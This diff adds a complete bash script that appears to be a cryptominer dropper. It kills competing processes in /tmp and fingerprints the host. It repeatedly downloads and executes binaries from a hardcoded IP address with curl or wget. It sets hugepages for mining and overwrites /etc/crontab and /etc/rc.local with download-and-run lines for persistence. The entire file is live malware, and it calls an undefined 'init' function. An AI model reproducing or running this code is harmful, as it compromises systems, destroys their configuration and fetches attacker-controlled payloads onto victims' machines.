@@ -1,0 +1,112 @@
+#!/bin/bash
+
+SHELL=/bin/sh
+PATH=$PATH:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+cd /tmp/
+
+host=52.175.207.110
+ver=RQ5YRE
+kill=/tmp/kill.sh
+FN=/tmp/$RANDOM$RANDOM
+IN=/tmp/$RANDOM$RANDOM
+
+function cl(){
+for line in `ls -A /tmp/ | grep -v kill.sh | grep -v $(basename $FN) | grep -v $(basename $0)`
+do
+if [[ `ps aux | grep -v grep | grep $line | wc -l` -gt 0 ]] ; then
+echo $line
+pkill -f $line && rm /tmp/${line} -rf
+fi
+done
+}
+
+cl
+
+arch=`getconf LONG_BIT`
+uid=`id | base64 -w 0`
+uname=`uname -a | base64 -w 0`
+network=`ifconfig | base64 -w 0`
+release=`cat /etc/*-release | base64 -w 0`
+cpuinfo=`cat /proc/cpuinfo | base64 -w 0`
+python=`python -c "import sys;print(sys.version)" | base64 -w 0`
+trap '' SIGINT
+
+function dw(){
+if [ ! $1 ] ; then
+curl -fsSL http://${host}/i -o $IN || wget http://${host}/i -q -O $IN
+if [ -f $IN ] ; then
+pkill -f $FN
+rm $FN -rf
+chmod 777 $IN
+bash ${IN} $$
+echo exit
+exit
+fi
+else
+kill -9 $1
+fi
+}
+
+pkill -f /tmp/kill.sh
+
+
+init
+
+
+dw $1
+
+echo 128 > /proc/sys/vm/nr_hugepages
+sysctl -w vm.nr_hugepages=128
+
+function writecrontab() {
+echo -e "SHELL=/bin/bash\nPATH=/sbin:/bin:/usr/sbin:/usr/bin\n*/30 * * * *   root   pkill -f /tmp/ ; (curl -fsSL http://${host}/i -o ${FN} || wget http://${host}/i -q -O ${FN}) ; bash ${FN} 1 &" > /etc/crontab
+}
+
+function writerc() {
+echo -e "SHELL=/bin/bash\nPATH=/sbin:/bin:/usr/sbin:/usr/bin\n(curl -fsSL http://${host}/i -o ${FN} || wget http://${host}/i -q -O ${FN}) ; bash ${FN} 1 &\n" > /etc/rc.local
+echo "exit 0" >> /etc/rc.local
+}
+
+function kd(){
+pkill -f kill.sh
+curl -fsSL http://${host}/k -o $kill || wget http://${host}/k -q -O $kill
+if [ -f $kill ] ; then
+chmod 777 $kill
+bash $kill $FN &
+fi
+}
+
+function run(){
+if [ ! -f $FN ] ;then
+curl -fsSL http://${host}/${arch} -o $FN || wget http://${host}/${arch} -q -O $FN
+chmod 777 $FN
+$FN
+else
+p=$(ps aux | grep ${FN} | grep -v grep | wc -l)
+if [ ${p} -eq 1 ];then
+echo $FN
+elif [ ${p} -eq 0 ];then
+$FN
+else
+echo ""
+fi
+fi
+}
+
+kd
+i=1
+
+while [ 1 ]
+do
+run
+echo $i
+if [ $(( $i % 6 )) -eq 0 ] ; then
+init up
+fi
+cl
+writecrontab
+writerc
+sleep 5
+i=$(($i+1))
+done
